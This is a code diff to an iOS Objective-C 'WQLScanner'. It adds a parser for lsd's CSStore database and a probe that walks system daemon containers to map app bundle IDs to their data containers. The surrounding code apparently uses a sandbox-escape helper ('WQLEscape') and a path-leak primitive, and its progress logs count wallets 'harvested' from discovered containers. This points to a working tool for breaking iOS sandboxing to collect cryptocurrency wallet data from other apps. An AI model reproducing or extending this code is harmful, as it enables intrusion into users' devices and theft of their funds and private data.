@@ -9,12 +9,56 @@
 #import <objc/message.h>
 #import <dlfcn.h>
 #import <stdlib.h>
+#import <string.h>
 #import <sys/sysctl.h>
 #import <stdarg.h>
 #import <sys/xattr.h>
 #import <sys/mount.h>
 
 static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manager.metadata.plist";
+
+// MARK: - lsd CSStore 解析（参考 worse_finder / WQFiles 的实测布局）
+
+static uint32_t WQLRd32(const uint8_t *p) {
+    uint32_t v;
+    memcpy(&v, p, 4);
+    return v;
+}
+
+/// 字符串记录：[u32 id][u32 length][UTF-8]，offset 即引用值（id << 2）
+static NSString *WQLCSString(const uint8_t *base, size_t size, size_t off) {
+    if (off > size || size - off < 8) return nil;
+    uint32_t len = WQLRd32(base + off + 4);
+    if (len == 0 || len >= 0x800 || len >= size - off - 8) return nil;
+    if (memchr(base + off + 8, 0, len)) return nil;
+    return [[NSString alloc] initWithBytes:base + off + 8
+                                    length:len
+                                  encoding:NSUTF8StringEncoding];
+}
+
+static NSDictionary<NSString *, NSString *> *WQLParseCSStore(NSData *data,
+                                                             uint32_t recordSize,
+                                                             uint32_t offBid,
+                                                             uint32_t offContainer) {
+    const uint8_t *base = data.bytes;
+    size_t size = data.length;
+    if (size < 0x1000) return nil;
+
+    NSMutableDictionary<NSString *, NSString *> *map = [NSMutableDictionary dictionary];
+    for (size_t off = 0; off + 8 + recordSize <= size; off += 4) {
+        if (WQLRd32(base + off + 4) != recordSize) continue;
+
+        const uint8_t *body = base + off + 8;
+        uint32_t refBid = WQLRd32(body + offBid);
+        uint32_t refCon = WQLRd32(body + offContainer);
+        if (!refBid || !refCon) continue;
+
+        NSString *bid = WQLCSString(base, size, refBid);
+        NSString *con = WQLCSString(base, size, refCon);
+        if (bid.length && con.length) map[bid] = con;
+    }
+    return map.count ? map : nil;
+}
 
 @interface WQLScanner ()
 - (void)log:(NSString *)fmt, ...;
@@ -59,6 +103,7 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
 - (void)moveStageToPending:(NSString *)stage wallet:(NSString *)wallet;
 - (void)prunePendingIfNeeded;
 - (void)probeLaunchServices:(NSArray<WQLTarget *> *)targets;
+- (void)probeLSStore;
 @property (nonatomic, assign, readwrite) BOOL lastRunUsable;
 @end
 
@@ -423,6 +468,72 @@ static uint64_t WQLFNV1a(const char *s) {
     [self log:@"    备忘录：%@（escape=%lld）", notesPath, (long long)h];
 }
 
+/// 只读探针：在 InternalDaemon 前 300 万 inode 里找 lsd 的 CSStore，
+/// 按 iOS 26 / 26.5 / 27 的四种记录布局各解析一次，看能映射出多少容器。
+- (void)probeLSStore {
+    [self log:@"【探针】lsd CSStore（只读）"];
+
+    NSDate *t0 = [NSDate date];
+    NSArray<NSString *> *daemons =
+        [WQLPathLeak childrenOfDirectory:@"/private/var/mobile/Containers/Data/InternalDaemon"
+                             upToInode:3000000];
+    [self log:@"    InternalDaemon 前 300 万 inode：%lu 个容器，耗时 %.1f 秒",
+          (unsigned long)daemons.count, -[t0 timeIntervalSinceNow]];
+
+    NSUInteger opened = 0, stores = 0;
+    for (NSString *container in daemons) {
+        int64_t handle = [[WQLEscape shared] consumeExtensionForPath:container error:nil];
+        if (handle <= 0) continue;
+        opened++;
+
+        NSString *caches = [container stringByAppendingPathComponent:@"Library/Caches"];
+        NSArray<NSString *> *names = [[NSFileManager defaultManager]
+                                      contentsOfDirectoryAtPath:caches error:nil];
+        for (NSString *name in names) {
+            if (![name hasSuffix:@".csstore"]) continue;
+
+            NSString *path = [caches stringByAppendingPathComponent:name];
+            NSData *data = [NSData dataWithContentsOfFile:path
+                                                  options:NSDataReadingMappedIfSafe
+                                                    error:nil];
+            if (data.length < 0x1000) continue;
+            if (memcmp(data.bytes, "bdsl", 4) != 0) continue;
+
+            stores++;
+            struct { uint32_t size, bid, con; const char *label; } layouts[] = {
+                {0x23c, 0x0c, 0x64, "26"},
+                {0x23c, 0x0c, 0x60, "26.5"},
+                {0x250, 0x0c, 0x68, "27.0"},
+                {0x25c, 0x0c, 0x6c, "27.2"},
+            };
+            NSDictionary *best = nil;
+            const char *bestLabel = "?";
+
+            for (int i = 0; i < 4; i++) {
+                NSDictionary *map = WQLParseCSStore(data, layouts[i].size,
+                                                    layouts[i].bid, layouts[i].con);
+                if (map.count > best.count) {
+                    best = map;
+                    bestLabel = layouts[i].label;
+                }
+            }
+
+            [self log:@"    📄 %@（%.1f MB，magic=bdsl）→ 布局 %s，%lu 条容器",
+                  name, data.length / 1048576.0, bestLabel, (unsigned long)best.count];
+
+            NSInteger shown = 0;
+            for (NSString *bid in best) {
+                if (shown++ >= 3) break;
+                [self log:@"        · %@ → %@", bid, best[bid]];
+            }
+        }
+        [[WQLEscape shared] releaseHandle:handle];
+    }
+
+    [self log:@"    合计：打开 %lu 个 daemon 容器，命中 %lu 个 csstore",
+          (unsigned long)opened, (unsigned long)stores];
+}
+
 #pragma mark - 主流程
 
 - (NSArray<NSDictionary<NSString *, id> *> *)scanWithOutputDirectory:(NSString *)outDir {
@@ -451,6 +562,7 @@ static uint64_t WQLFNV1a(const char *s) {
     }
     self.lastRunUsable = YES;
     [self probeLaunchServices:targets];
+    [self probeLSStore];
 
     NSArray<NSString *> *allRoots = [self defaultRoots];
     NSMutableDictionary<NSString *, NSArray<NSString *> *> *children = [NSMutableDictionary dictionary];
@@ -604,6 +716,8 @@ static uint64_t WQLFNV1a(const char *s) {
             __weak typeof(self) weakSelf = self;
             __block uint64_t lastPct = 0;
             __block uint64_t lastUiPct = 0;
+            __block NSTimeInterval lastRateT = 0;
+            __block uint64_t lastRateDone = 0;
             BOOL completed = NO;
             NSDictionary<NSString *, NSArray<NSString *> *> *scannedRes =
             [WQLPathLeak childrenOfDirectories:needScan
@@ -615,10 +729,15 @@ static uint64_t WQLFNV1a(const char *s) {
                 if (!self || total == 0) return;
                 uint64_t pct = done * 100 / total;
                 if (pct >= lastPct + 10) {
+                    NSTimeInterval now = [NSDate date].timeIntervalSince1970;
+                    double rate = (lastRateT > 0 && now > lastRateT)
+                                  ? (double)(done - lastRateDone) / (now - lastRateT) : 0;
+                    lastRateT = now;
+                    lastRateDone = done;
                     lastPct = pct;
-                    [self log:@"    扫描进度 %llu%%（已发现 %lu 个容器，采集 %lu 个钱包）",
+                    [self log:@"    扫描进度 %llu%%（已发现 %lu 个容器，采集 %lu 个钱包，%.0f inode/s）",
                           (unsigned long long)pct,
-                          (unsigned long)records.count, (unsigned long)matchedCount];
+                          (unsigned long)records.count, (unsigned long)matchedCount, rate];
                 }
                 if (self.progressBlock && pct >= lastUiPct + 1) {
                     lastUiPct = pct;
